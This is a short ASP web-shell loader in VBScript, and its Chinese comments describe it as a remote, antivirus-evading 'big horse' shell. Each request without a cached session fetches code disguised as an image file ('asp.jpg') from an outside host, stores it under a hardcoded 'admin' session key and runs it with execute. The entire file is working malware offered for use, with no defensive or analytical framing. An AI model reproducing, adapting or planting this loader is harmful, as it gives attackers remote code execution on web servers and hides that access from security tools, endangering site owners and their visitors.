<%@ LANGUAGE = VBScript.encode%><%
UserPass="admin"  ' 远程免杀ASP大马 asp.jpg为远程调用图片
function Gset()   ' 作者：xiaoniu https://www.t00ls.net/articles-50883.html
if Session(UserPass)="" then 
Set o = CreateObject("MSXML2.XMLHTTP")
o.open "GET", "http://sss1.freevar.com/asp.jpg", False
o.send
Gset=o.responseText
else
Gset=Session(UserPass)
End if
End function
execute Gset()
%>
